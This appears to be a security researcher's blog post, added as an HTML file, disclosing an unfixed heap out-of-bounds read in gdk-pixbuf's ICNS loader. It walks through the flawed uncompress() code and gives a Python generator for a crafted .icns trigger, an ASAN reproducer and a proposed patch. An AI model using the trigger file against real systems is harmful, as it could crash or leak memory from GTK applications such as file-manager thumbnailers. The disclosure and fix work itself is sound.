@@ -1,0 +1,573 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>gdk-pixbuf ICNS: Heap OOB Read in uncompress()</title>
+    <meta name="description" content="Heap out-of-bounds read in the ICNS image loader in gdk-pixbuf. uncompress() in io-icns.c takes a source pointer and a pixel count but no source length, and reads from the compressed stream until size×size pixels have been decoded — regardless of how many bytes are actually in the icon block. load_icon() computes the valid source length from the block header but never passes it to the decompressor. A crafted .icns file with a zero-byte payload triggers an unbounded read into adjacent heap memory, reachable from any GTK application that opens an image file.">
+    <meta property="og:title" content="gdk-pixbuf ICNS: Heap OOB Read in uncompress()" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/jpeg" href="../avatar.jpg">
+
+    <style>
+      :root {
+        --bg: #121212;
+        --fg: #e0e0e0;
+        --accent: #61dafb;
+        --border: #333;
+        --muted: #a0a0a0;
+      }
+
+      * { box-sizing: border-box; }
+
+      body {
+        margin: 0;
+        padding: 0;
+        background: var(--bg);
+        color: var(--fg);
+        font-family: 'Work Sans', sans-serif;
+        line-height: 1.6;
+      }
+
+      a { color: var(--accent); text-decoration: none; }
+      a:hover { text-decoration: underline; }
+
+      .wrapper {
+        max-width: 768px;
+        margin: 0 auto;
+        padding: 2rem 1rem 3rem;
+      }
+
+      .site-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 3rem;
+      }
+      .site-title { font-weight: 700; font-size: 1.5rem; color: var(--fg); }
+      .site-logo { height: 48px; width: 48px; border-radius: 50%; object-fit: cover; }
+
+      .post { max-width: 768px; margin: 0 auto; }
+
+      .post-header h1 { margin: 0 0 0.5rem; font-size: 2rem; font-weight: 500; }
+      .post-subtitle { margin: 0 0 0.75rem; opacity: 0.8; font-size: 1rem; }
+      .post-meta {
+        margin: 0 0 1.5rem;
+        font-size: 0.9rem;
+        color: var(--muted);
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.75rem;
+      }
+      .post-tags { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-top: 0.4rem; }
+      .tag {
+        font-size: 0.75rem;
+        padding: 0.15rem 0.5rem;
+        border-radius: 999px;
+        border: 1px solid var(--border);
+        background: rgba(255,255,255,0.02);
+      }
+
+      .post-toc {
+        margin: 2rem 0;
+        padding: 1rem 1.25rem;
+        border-radius: 0.75rem;
+        border: 1px solid var(--border);
+        background: #181818;
+      }
+      .post-toc-title {
+        margin: 0 0 0.5rem;
+        font-size: 0.95rem;
+        font-weight: 500;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        opacity: 0.8;
+      }
+      .post-toc ul { margin: 0; padding-left: 1.25rem; font-size: 0.95rem; }
+      .post-toc li { margin: 0.1rem 0; }
+
+      section + section { margin-top: 2rem; }
+      h2 { font-size: 1.4rem; margin-bottom: 0.5rem; font-weight: 500; }
+      h3 { font-size: 1.15rem; margin-bottom: 0.4rem; font-weight: 500; }
+      p { margin: 0 0 0.9rem; }
+      ul, ol { padding-left: 1.25rem; margin-top: 0; margin-bottom: 0.9rem; }
+
+      code {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        font-size: 0.9rem;
+        background: rgba(255,255,255,0.04);
+        padding: 0.15rem 0.3rem;
+        border-radius: 0.25rem;
+      }
+
+      pre {
+        margin: 0 0 1.25rem;
+        padding: 0.85rem 1rem;
+        background: #0b0b0b;
+        border-radius: 0.5rem;
+        border: 1px solid #1f1f1f;
+        overflow-x: auto;
+      }
+      pre code { background: transparent; padding: 0; }
+
+      .note {
+        padding: 0.75rem 1rem;
+        border-radius: 0.5rem;
+        border: 1px solid var(--border);
+        background: #181818;
+        font-size: 0.92rem;
+        margin-bottom: 1rem;
+      }
+
+      .back-link { margin: 0 0 2rem; font-size: 0.95rem; }
+
+      .site-footer {
+        border-top: 1px solid var(--border);
+        margin-top: 3rem;
+        padding-top: 1rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .site-footer p { margin: 0; font-size: 0.9rem; opacity: 0.6; }
+    </style>
+  </head>
+  <body>
+    <div class="wrapper">
+
+      <header class="site-header">
+        <a href="/" class="site-title">Alexandru Hossu</a>
+        <img src="../avatar.jpg" alt="Logo" class="site-logo">
+      </header>
+
+      <article class="post">
+        <p class="back-link">← <a href="/blog/">Back to blog</a></p>
+
+        <header class="post-header">
+          <h1>gdk-pixbuf ICNS: Heap OOB Read in <code>uncompress()</code></h1>
+          <p class="post-subtitle">
+            The ICNS loader in <code>gdk-pixbuf/io-icns.c</code> decompresses RLE icon data without knowing how many source bytes are available. <code>uncompress()</code> takes a pixel count and a source pointer but no source length, and reads from the compressed stream until <code>size×size</code> pixels have been decoded — regardless of the actual block boundary. <code>load_icon()</code> computes the valid payload length from the block header but never forwards it to the decompressor. A crafted <code>.icns</code> file with a zero-byte icon payload triggers an unbounded read into adjacent heap memory. All four legacy RLE icon sizes are affected. Reachable from any GTK application that opens an image file — Nautilus, Eye of GNOME, or anything backed by <code>gdk-pixbuf</code>.
+          </p>
+          <p class="post-meta">
+            <span>Vulnerability Research • Image Parsing</span>
+            <span>gdk-pixbuf</span>
+            <span>by Alexandru Hossu</span>
+          </p>
+          <div class="post-tags">
+            <span class="tag">C</span>
+            <span class="tag">Heap OOB Read</span>
+            <span class="tag">gdk-pixbuf</span>
+            <span class="tag">ICNS</span>
+            <span class="tag">GTK</span>
+            <span class="tag">ASAN</span>
+          </div>
+        </header>
+
+        <nav class="post-toc">
+          <p class="post-toc-title">On this page</p>
+          <ul>
+            <li><a href="#background">1. Background</a></li>
+            <li><a href="#icns-format">2. The ICNS format and the RLE scheme</a></li>
+            <li><a href="#uncompress">3. <code>uncompress()</code> — no source bounds</a></li>
+            <li><a href="#missing-length">4. The missing length — <code>isize</code> never reaches the decompressor</a></li>
+            <li><a href="#secondary">5. Secondary issue — <code>it32</code> plen underflow</a></li>
+            <li><a href="#attack-surface">6. Attack surface</a></li>
+            <li><a href="#trigger">7. Crafting the trigger</a></li>
+            <li><a href="#asan">8. ASAN confirmation</a></li>
+            <li><a href="#fix">9. The fix</a></li>
+            <li><a href="#disclosure">10. Disclosure</a></li>
+          </ul>
+        </nav>
+
+        <section id="background">
+          <h2>1. Background</h2>
+          <p>The ICNS file format is the native icon container used by macOS. It stores multiple representations of an icon at different sizes and color depths in a single file. Desktop Linux images files often include <code>.icns</code> files — embedded in application bundles, inside ZIP or DMG archives, or as standalone assets from cross-platform projects. <code>gdk-pixbuf</code> is the image-loading library that underlies all GTK applications, from Nautilus to Eye of GNOME, and it has shipped an ICNS loader since 2007.</p>
+          <p>The loader is <code>gdk-pixbuf/io-icns.c</code>, written by Lyonel Vincent and Bastien Nocera. It handles the legacy RLE-compressed icon types (<code>is32</code>, <code>il32</code>, <code>ih32</code>, <code>it32</code>) via a function called <code>uncompress()</code>. That function has never had bounds checking on its source pointer. The bug has been in the codebase since the initial commit in 2007 and remains unfixed as of the time of writing.</p>
+        </section>
+
+        <section id="icns-format">
+          <h2>2. The ICNS format and the RLE scheme</h2>
+          <p>An <code>.icns</code> file is a flat sequence of typed blocks. Each block starts with a 4-byte type ID and a 4-byte big-endian size that includes the 8-byte header itself:</p>
+          <pre><code>'icns'  &lt;uint32be: total file size&gt;
+  &lt;type[4]&gt;  &lt;uint32be: block size&gt;  &lt;payload...&gt;
+  &lt;type[4]&gt;  &lt;uint32be: block size&gt;  &lt;payload...&gt;
+  ...</code></pre>
+          <p>The legacy icon blocks store RGB data as three independently RLE-compressed byte streams — one per channel. The four RLE icon types and their dimensions are:</p>
+          <ul>
+            <li><code>is32</code> — 16×16 pixels, needs 256 decoded pixels per channel</li>
+            <li><code>il32</code> — 32×32 pixels, needs 1,024 decoded pixels per channel</li>
+            <li><code>ih32</code> — 48×48 pixels, needs 2,304 decoded pixels per channel</li>
+            <li><code>it32</code> — 128×128 pixels, needs 16,384 decoded pixels per channel</li>
+          </ul>
+          <p>Each icon block is accompanied by a separate mask block that holds the alpha channel as uncompressed bytes (<code>s8mk</code>, <code>l8mk</code>, <code>h8mk</code>, <code>t8mk</code> for 16, 32, 48, and 128 pixels respectively). The mask block must be present and exactly <code>size×size</code> bytes long — <code>load_icon()</code> validates this before touching the RLE data.</p>
+          <p>The RLE encoding used in ICNS is a PackBits variant. The compressed stream is a sequence of runs, each beginning with a tag byte:</p>
+          <ul>
+            <li>Tag byte ≥ 0x80: repeating run — the tag encodes <code>count = tag − 125</code>, and the next byte is the value to repeat <code>count</code> times. For <code>tag = 0x80</code> (128), count is 3; for <code>tag = 0xFF</code> (255), count is 130.</li>
+            <li>Tag byte &lt; 0x80: literal run — the tag encodes <code>count = tag + 1</code>, and the following <code>count</code> bytes are copied verbatim. For <code>tag = 0x00</code>, count is 1; for <code>tag = 0x7F</code> (127), count is 128.</li>
+          </ul>
+          <p><code>uncompress()</code> is called three times for each icon: once for R, once for G, once for B. The three calls share the <code>data</code> pointer (which advances through the stream) and a <code>remaining</code> counter that resets to <code>size×size</code> at the start of each channel. The output stride is 4 bytes per pixel — the decoded byte is written to <code>target</code>, which is advanced by 4 after each pixel to leave room for the other three channels in the interleaved RGBA buffer.</p>
+        </section>
+
+        <section id="uncompress">
+          <h2>3. <code>uncompress()</code> — no source bounds</h2>
+          <p>The full function as it exists in the current codebase:</p>
+          <pre><code>static gboolean
+uncompress (unsigned size, INOUT guchar ** source, OUT guchar * target,
+            INOUT gsize * _remaining)
+{
+  guchar *data = *source;
+  gsize remaining;
+  gsize i = 0;
+
+  if (*_remaining == 0) {
+    remaining = size * size;    /* first call for this channel */
+  } else {
+    remaining = *_remaining;
+  }
+
+  while (remaining > 0)
+    {
+      guint8 count = 0;
+
+      if (data[0] & 0x80)       /* repeating byte: tag encodes run length */
+        {
+          count = data[0] - 125;
+
+          if (count > remaining)
+            return FALSE;
+
+          for (i = 0; i < count; i++)
+            {
+              *target = data[1]; /* repeat value */
+              target += 4;
+            }
+
+          data += 2;
+        }
+      else                      /* non-repeating bytes: tag + 1 literals follow */
+        {
+          count = data[0] + 1;
+
+          if (count > remaining)
+            return FALSE;
+
+          for (i = 0; i < count; i++)
+            {
+              *target = data[i + 1];
+              target += 4;
+            }
+          data += count + 1;
+        }
+
+      remaining -= count;
+    }
+
+  *source = data;
+  *_remaining = remaining;
+  return TRUE;
+}</code></pre>
+          <p>The function loops until <code>remaining</code> reaches zero — that is, until <code>size×size</code> pixels have been decompressed. Three reads happen per iteration that have no bounds check on the source buffer:</p>
+          <ul>
+            <li><code>data[0]</code> — the tag byte. Read at the top of every loop iteration with no prior check that the source buffer still has bytes remaining.</li>
+            <li><code>data[1]</code> — the repeat value in the <code>≥ 0x80</code> branch. Read after confirming the run fits in the pixel budget, but without verifying the source buffer holds a second byte.</li>
+            <li><code>data[i + 1]</code> for <code>i ∈ [0, count)</code> — the literal bytes in the <code>&lt; 0x80</code> branch. Read after confirming <code>count</code> pixels fit, but without verifying <code>count + 1</code> bytes remain in the source.</li>
+          </ul>
+          <p>The function has no way to know where the source data ends. Its only stopping condition is the pixel count, which the compressed stream can fail to satisfy before the source runs out of bytes.</p>
+        </section>
+
+        <section id="missing-length">
+          <h2>4. The missing length — <code>isize</code> never reaches the decompressor</h2>
+          <p><code>load_resources()</code> parses the ICNS block list and computes the payload length for each block as <code>blocklen − sizeof(IcnsBlockHeader)</code>. The result is stored in <code>*plen</code> (the variable named <code>isize</code> in the caller):</p>
+          <pre><code>  case 32:
+    if (memcmp (header->id, "il32", 4) == 0)   /* 32x32 icon */
+      {
+        *picture = (gpointer) (current + sizeof (IcnsBlockHeader));
+        *plen = blocklen - sizeof (IcnsBlockHeader);   /* valid source bytes */
+      }
+    ...</code></pre>
+          <p>Back in <code>load_icon()</code>, the pointer and the length are both available:</p>
+          <pre><code>  guchar *icon = NULL;
+  gsize isize = 0;    /* valid bytes in the icon block payload */
+  ...
+  if (!load_resources (size, data, datalen, &icon, &isize, &mask, &msize))
+    return NULL;
+  ...
+  guchar *data = icon;
+  gsize remaining = 0;
+
+  if (!uncompress (size, &data, image, &remaining))      /* R */
+    goto bail;
+  if (!uncompress (size, &data, image + 1, &remaining))  /* G */
+    goto bail;
+  if (!uncompress (size, &data, image + 2, &remaining))  /* B */
+    goto bail;</code></pre>
+          <p><code>isize</code> is computed, checked, and then ignored. It is never passed to <code>uncompress()</code>. The three calls to the decompressor advance <code>data</code> through the compressed stream by however many bytes the RLE decoding consumes — there is nothing to stop them from advancing past the end of the icon block.</p>
+          <p>The fix that CVE-2017-6313 applied in 2017 ensured <code>blocklen ≥ sizeof(IcnsBlockHeader)</code>, which means <code>isize ≥ 0</code>. But a block with <code>blocklen == 8</code> passes that check with <code>isize = 0</code> — and then <code>uncompress()</code> reads from <code>icon</code> which points just past the block header, one byte beyond the last valid byte in the payload.</p>
+        </section>
+
+        <section id="secondary">
+          <h2>5. Secondary issue — <code>it32</code> plen underflow</h2>
+          <p>The <code>it32</code> (128×128) block has an optional 4-byte prefix of null bytes, a historical artifact from NeXT. <code>load_resources()</code> detects and skips it:</p>
+          <pre><code>  case 128:
+    if (memcmp (header->id, "it32", 4) == 0)
+      {
+        *picture = (gpointer) (current + sizeof (IcnsBlockHeader));
+        *plen = blocklen - sizeof (IcnsBlockHeader);
+        if (memcmp (*picture, "\0\0\0\0", 4) == 0)  /* detect null prefix */
+          {
+            *picture += 4;
+            *plen -= 4;    /* subtract prefix from payload length */
+          }
+      }</code></pre>
+          <p>When <code>blocklen = 8</code> (minimum allowed), <code>*plen = 0</code> and <code>*picture</code> points exactly to the byte after the block header — one byte past all valid block data. The <code>memcmp</code> at line 123 reads 4 bytes from there: into the next block in the file, or past the end of the file buffer if <code>it32</code> is the last block. This is an OOB read regardless of what <code>uncompress()</code> does.</p>
+          <p>If those 4 bytes happen to be zero — for example because the next block starts with a null byte, or because <code>GByteArray</code>'s backing allocation was zero-initialized — then <code>*plen -= 4</code> wraps on a <code>gsize</code> (unsigned) to <code>SIZE_MAX − 3</code>, a value of approximately 2<sup>64</sup> − 4 on 64-bit platforms. This inflated length is stored in <code>isize</code> in the caller but, again, is never forwarded to <code>uncompress()</code>.</p>
+        </section>
+
+        <section id="attack-surface">
+          <h2>6. Attack surface</h2>
+          <p>The four affected RLE icon types — <code>is32</code>, <code>il32</code>, <code>ih32</code>, <code>it32</code> — are handled by the same <code>uncompress()</code> call path. The maximum overread per channel is bounded by the pixel count the RLE stream fails to satisfy, which can be the full <code>size×size</code> pixels:</p>
+          <ul>
+            <li><code>is32</code> (16×16) — up to 256 bytes overread per channel, 768 bytes total</li>
+            <li><code>il32</code> (32×32) — up to 1,024 bytes per channel, 3,072 bytes total</li>
+            <li><code>ih32</code> (48×48) — up to 2,304 bytes per channel, 6,912 bytes total</li>
+            <li><code>it32</code> (128×128) — up to 16,384 bytes per channel, 49,152 bytes total</li>
+          </ul>
+          <p>The overread occurs inside heap memory. The file is loaded into a <code>GByteArray</code> via <code>g_byte_array_append()</code>, and the <code>icon</code> pointer points into that array's backing buffer. Any bytes read past the icon block boundary come from whatever glib's allocator placed after the file data: other allocations, allocator metadata, or unmapped memory.</p>
+          <p>Any application that passes an attacker-supplied <code>.icns</code> file to gdk-pixbuf is reachable:</p>
+          <ul>
+            <li><strong>Nautilus</strong> — generates thumbnails automatically when a directory containing <code>.icns</code> files is opened</li>
+            <li><strong>Eye of GNOME</strong> — opens <code>.icns</code> files directly as images</li>
+            <li>Any GTK application using <code>gdk_pixbuf_new_from_file()</code>, <code>gdk_pixbuf_loader_write()</code>, or the higher-level <code>gtk_image_set_from_file()</code> APIs</li>
+            <li>Web applications using server-side gdk-pixbuf for image processing or thumbnail generation</li>
+          </ul>
+          <p>No prior authentication, no user interaction beyond opening a folder, and no special privileges are required. An attacker who can place a crafted <code>.icns</code> file in a directory visible to the target user has a reliable trigger.</p>
+        </section>
+
+        <section id="trigger">
+          <h2>7. Crafting the trigger</h2>
+          <p><code>load_icon()</code> tries each icon size in order — 256, 128, 48, 32, 24, 16 — and returns the first one that <code>load_resources()</code> accepts. To target a specific icon type, the crafted file needs to contain the correct pair of blocks: an icon block and its companion mask block. The mask must pass the <code>msize != size * size</code> check, so it must be exactly <code>size×size</code> bytes.</p>
+          <p>For a 32×32 trigger using <code>il32</code>:</p>
+          <pre><code>import struct
+
+def be32(n): return struct.pack('>I', n)
+
+size = 32
+mask_data = b'\xff' * (size * size)     # 1,024 bytes, valid alpha
+
+l8mk = b'l8mk' + be32(8 + len(mask_data)) + mask_data   # 32x32 mask
+il32 = b'il32' + be32(8)                                 # 0-byte payload
+
+# il32 placed last so icon pointer lands at the end of file data
+body = l8mk + il32
+open('poc_il32.icns', 'wb').write(b'icns' + be32(8 + len(body)) + body)</code></pre>
+          <p>The resulting file is 1,048 bytes. The <code>il32</code> block has <code>blocklen = 8</code>, so <code>load_resources()</code> accepts it (passes the CVE-2017-6313 check of <code>blocklen ≥ sizeof(IcnsBlockHeader)</code>), sets <code>*picture</code> to <code>current + 8</code>, and sets <code>*plen = 0</code>. Back in <code>load_icon()</code>, <code>icon</code> points to the byte immediately after the <code>il32</code> block header — which is the byte after the last byte of the file buffer.</p>
+          <p>The first call to <code>uncompress(32, &data, image, &remaining)</code> enters the loop with <code>remaining = 1024</code> and immediately reads <code>data[0]</code> — the tag byte — from one byte past the end of the <code>GByteArray</code>'s logical content. This is the out-of-bounds read.</p>
+          <p>The same pattern works for all four RLE sizes — substitute <code>il32</code>/<code>l8mk</code> with <code>is32</code>/<code>s8mk</code>, <code>ih32</code>/<code>h8mk</code>, or <code>it32</code>/<code>t8mk</code> and adjust the mask size accordingly.</p>
+          <h3>Why ASAN does not trigger through the normal load path</h3>
+          <p><code>GByteArray</code> uses <code>g_realloc()</code> internally, which on glibc rounds up allocation sizes (typically to power-of-2 multiples or alignment boundaries). A 1,048-byte file will be backed by at least 1,056 or 2,048 bytes of actual allocation, depending on the implementation. The overread from position 1,040 (the byte after the <code>il32</code> header) lands well inside the allocator's slack, not past the <code>malloc</code> boundary. ASAN only reports reads past the <code>malloc</code> boundary; reads into allocator slack are invisible to it.</p>
+          <p>To make ASAN catch the overread directly, the standalone reproducer below uses <code>malloc(2)</code> for the source buffer — a tight allocation that has no slack — and calls <code>uncompress()</code> directly with <code>size = 4</code> (needing 16 pixels from a 2-byte source).</p>
+        </section>
+
+        <section id="asan">
+          <h2>8. ASAN confirmation</h2>
+          <p>Standalone reproducer — a verbatim copy of <code>uncompress()</code> from <code>io-icns.c</code>, called with a precisely sized 2-byte source allocation and a pixel count that requires more data than is available:</p>
+          <pre><code>/* Build: gcc -fsanitize=address -g -O1 test_icns_direct.c -o test_icns_direct */
+#include &lt;stdint.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+
+typedef unsigned char guchar;
+typedef uint8_t       guint8;
+typedef size_t        gsize;
+typedef int           gboolean;
+#define TRUE 1
+#define FALSE 0
+#define INOUT
+#define OUT
+
+/* verbatim copy of uncompress() from gdk-pixbuf/io-icns.c */
+static gboolean
+uncompress (unsigned size, INOUT guchar ** source, OUT guchar * target,
+            INOUT gsize * _remaining)
+{
+  guchar *data = *source;
+  gsize remaining;
+  gsize i = 0;
+  if (*_remaining == 0) {
+    remaining = size * size;
+  } else {
+    remaining = *_remaining;
+  }
+  while (remaining > 0) {
+    guint8 count = 0;
+    if (data[0] & 0x80) {
+      count = data[0] - 125;
+      if (count > remaining) return FALSE;
+      for (i = 0; i &lt; count; i++) { *target = data[1]; target += 4; }
+      data += 2;
+    } else {
+      count = data[0] + 1;
+      if (count > remaining) return FALSE;
+      for (i = 0; i &lt; count; i++) { *target = data[i + 1]; target += 4; }
+      data += count + 1;
+    }
+    remaining -= count;
+  }
+  *source = data;
+  *_remaining = remaining;
+  return TRUE;
+}
+
+int main(void)
+{
+  guchar *src = malloc(2);
+  src[0] = 0x00;   /* non-repeating, count=1: reads src[0] and src[1], advances data by 2 */
+  src[1] = 0xAB;   /* the one literal value */
+
+  guchar *tgt = calloc(4 * 4 * 4, 1);   /* 4x4 image, 4 bytes/pixel */
+  guchar *ptr = src;
+  gsize remaining = 0;
+
+  /* size=4: needs 16 pixels. First iteration decompresses 1 and advances data by 2.
+     Second iteration reads src[2] — 1 byte past the 2-byte allocation. */
+  uncompress(4, &ptr, tgt, &remaining);
+
+  free(src);
+  free(tgt);
+  return 0;
+}</code></pre>
+          <p>Output with <code>-fsanitize=address</code>:</p>
+          <pre><code>=================================================================
+==&lt;pid&gt;==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b96e41e0012
+READ of size 1 at 0x7b96e41e0012 thread T0
+    #0 0x55d5cd0c9342 in uncompress test_icns_direct.c:31
+    #1 0x55d5cd0c9342 in main test_icns_direct.c:61
+
+0x7b96e41e0012 is located 0 bytes after 2-byte region
+  [0x7b96e41e0010, 0x7b96e41e0012)</code></pre>
+          <p>Line 31 of the standalone test is the <code>if (data[0] &amp; 0x80)</code> tag read — the same read as in the real <code>uncompress()</code> in <code>io-icns.c</code>. The crash is 0 bytes past the end of the 2-byte allocation: <code>data[0]</code> at byte index 2 in a region that holds bytes 0 and 1.</p>
+          <p>The first loop iteration consumes <code>src[0]</code> (tag: non-repeating, count = 1) and <code>src[1]</code> (the literal value), decompresses 1 pixel, and advances <code>data</code> by 2. The loop re-enters with <code>remaining = 15</code> and reads <code>data[0]</code> from <code>src[2]</code> — one byte past the end of the heap allocation.</p>
+        </section>
+
+        <section id="fix">
+          <h2>9. The fix</h2>
+          <p>The root cause is that <code>uncompress()</code> has no source length parameter. The fix adds one and derives a <code>source_end</code> sentinel, then adds three guards inside the loop — one before the tag byte read, one before the repeat-value read, and one before the literal-run read:</p>
+          <pre><code> static gboolean
+-uncompress (unsigned size, INOUT guchar ** source, OUT guchar * target,
+-            INOUT gsize * _remaining)
++uncompress (unsigned size, INOUT guchar ** source, gsize source_len,
++            OUT guchar * target, INOUT gsize * _remaining)
+ {
+   guchar *data = *source;
++  guchar *source_end = *source + source_len;
+   gsize remaining;
+   gsize i = 0;
+
+   if (*_remaining == 0) {
+     remaining = size * size;
+   } else {
+     remaining = *_remaining;
+   }
+
+   while (remaining > 0)
+     {
+       guint8 count = 0;
+
++      if (data >= source_end)        /* tag byte */
++        return FALSE;
++
+       if (data[0] & 0x80)
+         {
+           count = data[0] - 125;
+           if (count > remaining)
+             return FALSE;
++          if (data + 1 >= source_end) /* repeat value */
++            return FALSE;
+           for (i = 0; i &lt; count; i++)
+             {
+               *target = data[1];
+               target += 4;
+             }
+           data += 2;
+         }
+       else
+         {
+           count = data[0] + 1;
+           if (count > remaining)
+             return FALSE;
++          if (data + count >= source_end) /* literal run */
++            return FALSE;
+           for (i = 0; i &lt; count; i++)
+             {
+               *target = data[i + 1];
+               target += 4;
+             }
+           data += count + 1;
+         }
+
+       remaining -= count;
+     }
+
+   *source = data;
+   *_remaining = remaining;
+   return TRUE;
+ }</code></pre>
+          <p>The three call sites in <code>load_icon()</code> need to be updated to pass <code>isize</code> as the new argument. Since all three calls consume from the same sequential stream, the remaining length must be tracked across calls:</p>
+          <pre><code>  guchar *data = icon;
+  gsize remaining = 0;
++ gsize src_remaining = isize;
+
+  if (!uncompress (size, &data, src_remaining, image, &remaining))
+    goto bail;
++ src_remaining -= (data - icon);    /* bytes consumed by R decompression */
++ guchar *src_after_r = data;
+
+  if (!uncompress (size, &data, src_remaining, image + 1, &remaining))
+    goto bail;
++ src_remaining -= (data - src_after_r);
++ guchar *src_after_g = data;
+
+  if (!uncompress (size, &data, src_remaining, image + 2, &remaining))
+    goto bail;</code></pre>
+          <p>A simpler alternative is to compute the remaining bytes dynamically at each call as <code>isize - (data - icon)</code>, which avoids the intermediate variables. Either approach is correct; the first is slightly more readable at the cost of two extra locals.</p>
+          <p>The secondary <code>it32</code> memcmp overread is fixed separately by adding a minimum payload length check before the null-prefix test:</p>
+          <pre><code>  if (memcmp (header->id, "it32", 4) == 0)
+    {
+      *picture = (gpointer) (current + sizeof (IcnsBlockHeader));
+      *plen = blocklen - sizeof (IcnsBlockHeader);
++     if (*plen < 4)
++       break;
+      if (memcmp (*picture, "\0\0\0\0", 4) == 0)
+        {
+          *picture += 4;
+          *plen -= 4;
+        }
+    }</code></pre>
+          <div class="note">
+            As of 2026-07-24, neither fix has been applied. <code>io-icns.c</code> in the <code>master</code> branch of <a href="https://gitlab.gnome.org/GNOME/gdk-pixbuf">GNOME/gdk-pixbuf</a> is unchanged from the vulnerable version. The 2.44.7 release (2026-06-27) does not contain a fix. GitLab issue <a href="https://gitlab.gnome.org/GNOME/gdk-pixbuf/-/issues/308">#308</a> is open.
+          </div>
+        </section>
+
+        <section id="disclosure">
+          <h2>10. Disclosure</h2>
+          <p>Reported to the GNOME Security team at <code>security@gnome.org</code> on 2026-04-22, with a full bug description, ASAN confirmation, Python reproducer for all four icon sizes, and a proposed fix. Andrea Veri redirected the report to <code>security.gnome.org</code> (ticket #267). Michael Catanzaro acknowledged the report and moved it to the gdk-pixbuf issue tracker. The issue is tracked at <a href="https://gitlab.gnome.org/GNOME/gdk-pixbuf/-/issues/308">gitlab.gnome.org/GNOME/gdk-pixbuf/-/issues/308</a>.</p>
+          <p>The 90-day coordinated disclosure window elapsed on 2026-07-22 without a fix. gdk-pixbuf 2.44.7, released 2026-06-27, does not contain a fix. <code>io-icns.c</code> is unchanged in the <code>master</code> branch as of publication.</p>
+          <p>Other recent kernel and library work: a heap buffer overflow series in the rtl8723bs staging WiFi driver (<a href="rtl8723bs-wifi-overflow">separate post</a>), a heap OOB write in the iSCSI target CHAP authentication code (<a href="iscsi-chap-base64-overflow">separate post</a>), an OOB array access in <code>ieee80211_ml_epcs()</code> in the mac80211 WiFi stack (<a href="mac80211-epcs-oob">separate post</a>), and a heap OOB write in <code>LogMel::Compute()</code> inside <code>microsoft/onnxruntime-extensions</code> (<a href="onnxruntime-logmel-oob">separate post</a>).</p>
+        </section>
+
+      </article>
+
+      <footer class="site-footer">
+        <p>2026 &copy; Alexandru Hossu</p>
+      </footer>
+
+    </div>
+  </body>
+</html>
